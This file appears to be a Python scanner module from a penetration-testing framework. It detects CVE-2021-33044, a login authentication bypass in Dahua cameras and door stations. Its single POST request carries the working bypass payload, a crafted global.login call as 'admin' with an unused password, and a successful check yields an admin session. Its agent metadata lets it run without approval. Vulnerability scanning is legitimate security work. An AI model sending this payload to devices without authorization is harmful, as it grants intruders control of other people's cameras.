#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Some Dahua products contain an authentication bypass during the login process."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Dahua IPC/VTH/VTO - Authentication Bypass Detection',
        'description': 'Some Dahua products contain an authentication bypass during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'dahua', 'auth-bypass', 'seclists', 'dahuasecurity', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/dorkerdevil/CVE-2021-33044',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-33044',
            'https://seclists.org/fulldisclosure/2021/Oct/13',
            'https://www.dahuasecurity.com/support/cybersecurity/details/957',
            'https://github.com/bp2008/DahuaLoginBypass',
        ],
        'cve': 'CVE-2021-33044',
    }

    def run(self):
        path = '/RPC2_Login'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': 'application/json, text/javascript, */*; q=0.01', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': '{{BaseURL}}', 'Referer': '{{BaseURL}}'}, data='{"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"result":true,"session"', 'id', 'params',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Dahua IPC/VTH/VTO - Authentication Bypass detected', path=path)
            return True
        return False

